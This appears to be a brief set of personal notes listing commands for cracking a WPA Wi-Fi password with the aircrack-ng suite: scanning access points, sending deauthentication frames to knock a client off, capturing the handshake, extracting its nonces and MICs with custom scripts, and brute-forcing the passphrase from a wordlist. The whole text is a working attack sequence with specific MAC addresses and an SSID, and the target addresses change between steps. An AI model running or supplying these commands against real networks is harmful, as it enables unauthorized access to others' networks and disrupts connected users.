## 1. Scan available access points
sudo airodump-ng -w scan-aps wlp1s0mon
## 2. Extract all APs with their MAC address and channels
python3 extract-aps.py
## 3. Scan that AP on its channel to get the clients connected to it
sudo airodump-ng --bssid d6:02:7d:0a:64:9d -c 8 -w do-deauth wlp1s0mon
## 4. Send the deauth frame to that client
sudo aireplay-ng --deauth 10 -a d6:02:7d:0a:64:9d -c 34:6F:24:BE:87:95 wlp1s0mon
## 5. Extract the full handshake
## 6. Extract values (ANonce, SNonce, MICs)
python3 extract-handshake.py do-deauth-05.cap --ssid "4010" --ap e8:48:b8:f0:0f:9c --client 52:62:E7:6C:26:C2 --out handshake.json

## 7. Brute-force password and match


aircrack-ng -w smartlist.txt -b e8:48:b8:f0:0f:9c --debug do-deauth-05.cap
